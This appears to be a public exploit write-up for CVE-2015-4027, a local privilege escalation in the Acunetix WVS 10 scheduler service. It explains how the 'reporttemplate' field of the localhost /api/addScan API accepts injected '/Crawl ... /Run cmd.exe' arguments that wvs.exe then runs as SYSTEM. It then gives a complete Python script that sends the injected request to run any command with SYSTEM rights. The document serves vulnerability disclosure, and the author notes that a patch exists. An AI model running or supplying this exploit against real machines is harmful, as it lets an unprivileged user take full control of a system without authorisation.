'''
========================================================================
Acunetix WVS 10 - from guest to Sytem (Local privilege escalation)

CVE: CVE-2015-4027
Author: (me) Daniele Linguaglossa
Affected Product: Acunetix WVS 10
Exploit: Local privilege escalation
Vendor: Acunetix ltd
Remote: No
Version: 10
=========================================================================
A local privilege escalation exists in Acunetix  WVS 10, it allow
a local user (even guest) to gain same privilege as System user.

With default Acunetix installation, a service called "AcuWVSSchedulerv10"
will be installed, this service run as local system user.

AcuWVSSchedulerv10 is reponsable for scan scheduling without user interaction
it expose some API to interact via a web server usually localhost:8183.

API:

/listScan
/addScan <== vulnerable one
/deleteScan
etc...

When a user schedule a scan API "addScan" will be called as following

-------------------------------------------------------------------------------
POST /api/addScan HTTP/1.1
Host: localhost:8183
User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:42.0) Gecko/20100101 Firefox/42.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/json; charset=UTF-8
RequestValidated: true
X-Requested-With: XMLHttpRequest
Referer: http://localhost:8183/
Content-Length: 452
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache

{
    "scanType": "scan",
    "targetList": "",
    "target": ["http://.target.it"],
    "recurse": "-1",
    "date": "12/2/2015",
    "dayOfWeek": "1",
    "dayOfMonth": "1",
    "time": "12:21",
    "deleteAfterCompletion": "False",
    "params": {
        "profile": "Default",
        "loginSeq": "<none>",
        "settings": "Default",
        "scanningmode": "heuristic",
        "excludedhours": "<none>",
        "savetodatabase": "True",
        "savelogs": "False",
        "generatereport": "False",
        "reportformat": "PDF",
        "reporttemplate": "WVSAffectedItemsReport.rep",
        "emailaddress": ""
    }
}
------------------------------------------------------------------------------

The first thing i noticed was the reporttemplate, this was used to create report
when scanning ends, so it means an external file wich we can control will be then 
used by System! this would be interesting enough but i never look deep into.
Instead i noticed something even worst, filename was used as argument to wvs.exe
called with system privilege!

By looking at how Acunetix handled reporttemplate argument i figured out that was 
possibile to inject custom arguments within reporttemplate, now this is where 
Acunetix help us :D in fact wvs was provided with an interesting argument it was 
/Run as reference says:

https://www.acunetix.com/blog/docs/acunetix-wvs-cli-operation/

Run a command line command during the crawl.
Syntax: /Run [command]

Example: /Run curl http://example.com/dir1/

Wow that's really nice, so in order to execute a command we must insert a fake 
Crawl followed by a Run command so reporttemplate become:

"reporttemplate": "WVSAffectedItemsReport.rep /Craw http://fakesite.it /Run cmd.exe"

it worked cmd runned as System!
==================================================================================

Now let's pwn this!

escalation.py
'''

import httplib
import json
from datetime import datetime
import sys
from time import gmtime, strftime


COMMAND = sys.argv[1] if len(sys.argv) > 1 else "cmd.exe"
ACUHOST = '127.0.0.1'
ACUPORT = 8183
ACUHEADERS = {
    "Content-Type": "application/json; charset=UTF-8",
    "X-Requested-With": "XMLHttpRequest",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "RequestValidated": "true"
    }
ACUEXPLOIT = "/Crawl http://www.google.it /Run \""+ COMMAND + "\"" 
ACUDATA = {"scanType":"scan",
           "targetList":"",
           "target":["http://"+"A"*2048],
           "recurse":"-1",
           "date":strftime("%m/%d/%Y", gmtime()),
           "dayOfWeek":"1",
           "dayOfMonth":"1",
           "time": "%s:%s" % (datetime.now().hour, datetime.now().minute+1),
           "deleteAfterCompletion":"False",
           "params":{"profile":"Default",
                     "loginSeq":"<none>",
                     "settings":"Default",
                     "scanningmode":"heuristic",
                     "excludedhours":"<none>",
                     "savetodatabase":"True",
                     "savelogs":"False",
                     "generatereport":"False",
                     "reportformat":"PDF",
                     "reporttemplate":"WVSDeveloperReport.rep " + ACUEXPLOIT,
                     "emailaddress":""}
           }

def sendExploit():
    conn = httplib.HTTPConnection(ACUHOST, ACUPORT)
    conn.request("POST", "/api/addScan", json.dumps(ACUDATA), ACUHEADERS)
    resp = conn.getresponse()
    return "%s %s" % (resp.status, resp.reason)

print "Acunetix Wvs 10 Local priviledge escalation by Daniele Linguaglossa\n"
print "[+] Command : %s will be executed as SYSTEM" % COMMAND
print "[+] Sending exploit..."
print "[+] Result: "+sendExploit()
print "[+] Done!"

'''
============================================================================

I hope this write-up was funny enough anyway i really would like to thank
Acunetix product manager N.S. for the really fast answer and bug mitigation, 
right now a patch exists so hurry up download it now.
============================================================================
'''